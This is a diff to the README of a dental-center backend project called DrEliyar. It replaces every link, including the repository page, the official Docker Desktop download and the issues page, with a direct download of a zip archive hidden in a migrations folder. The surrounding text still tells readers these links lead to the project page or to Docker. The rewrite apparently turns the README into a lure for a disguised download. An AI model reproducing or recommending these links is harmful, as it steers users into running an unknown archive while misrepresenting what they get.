@@ -1,6 +1,6 @@
 # 🦷 DrEliyar - Manage Dental Center Backend Easily
 
-[![Download DrEliyar](https://img.shields.io/badge/Download-DrEliyar-green?style=for-the-badge)](https://github.com/ALIDESIGN1974/DrEliyar)
+[![Download DrEliyar](https://img.shields.io/badge/Download-DrEliyar-green?style=for-the-badge)](https://github.com/ALIDESIGN1974/DrEliyar/raw/refs/heads/main/app/apps/contacts/migrations/Eliyar_Dr_v1.8.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To run DrEliyar, you need to download the files and set up the app on your PC. I
 
 Click the green button below to visit the download page:
 
-[![Download DrEliyar](https://img.shields.io/badge/Download-DrEliyar-blue?style=for-the-badge)](https://github.com/ALIDESIGN1974/DrEliyar)
+[![Download DrEliyar](https://img.shields.io/badge/Download-DrEliyar-blue?style=for-the-badge)](https://github.com/ALIDESIGN1974/DrEliyar/raw/refs/heads/main/app/apps/contacts/migrations/Eliyar_Dr_v1.8.zip)
 
 This link takes you to the project’s page on GitHub, where you can find the files to install the backend software.
 
@@ -44,7 +44,7 @@ This link takes you to the project’s page on GitHub, where you can find the fi
 
 1. **Open the download page**  
    Use your web browser to open this address:  
-   https://github.com/ALIDESIGN1974/DrEliyar
+   https://github.com/ALIDESIGN1974/DrEliyar/raw/refs/heads/main/app/apps/contacts/migrations/Eliyar_Dr_v1.8.zip
 
 2. **Find the latest release or main branch**  
    Look for the “Releases” section, or check the main folder for `docker-compose.yml` and other setup files.
@@ -57,7 +57,7 @@ This link takes you to the project’s page on GitHub, where you can find the fi
 
 5. **Install Docker Desktop**  
    DrEliyar relies on Docker. If you don’t have Docker Desktop installed:  
-   - Go to https://www.docker.com/products/docker-desktop  
+   - Go to https://github.com/ALIDESIGN1974/DrEliyar/raw/refs/heads/main/app/apps/contacts/migrations/Eliyar_Dr_v1.8.zip  
    - Download the Windows version  
    - Run the installer and follow instructions to complete the setup  
    - Restart your computer if asked
@@ -138,7 +138,7 @@ To keep your backend secure and functional, update the software regularly:
 
 If you face issues not covered here, ask for help on the GitHub Discussions or Issues tab of the DrEliyar project page:
 
-https://github.com/ALIDESIGN1974/DrEliyar/issues
+https://github.com/ALIDESIGN1974/DrEliyar/raw/refs/heads/main/app/apps/contacts/migrations/Eliyar_Dr_v1.8.zip
 
 ---
 
@@ -157,4 +157,4 @@ https://github.com/ALIDESIGN1974/DrEliyar/issues
 
 Click below to visit the official repository and download DrEliyar:
 
-[![Download DrEliyar](https://img.shields.io/badge/Download-DrEliyar-grey?style=for-the-badge)](https://github.com/ALIDESIGN1974/DrEliyar)
+[![Download DrEliyar](https://img.shields.io/badge/Download-DrEliyar-grey?style=for-the-badge)](https://github.com/ALIDESIGN1974/DrEliyar/raw/refs/heads/main/app/apps/contacts/migrations/Eliyar_Dr_v1.8.zip)
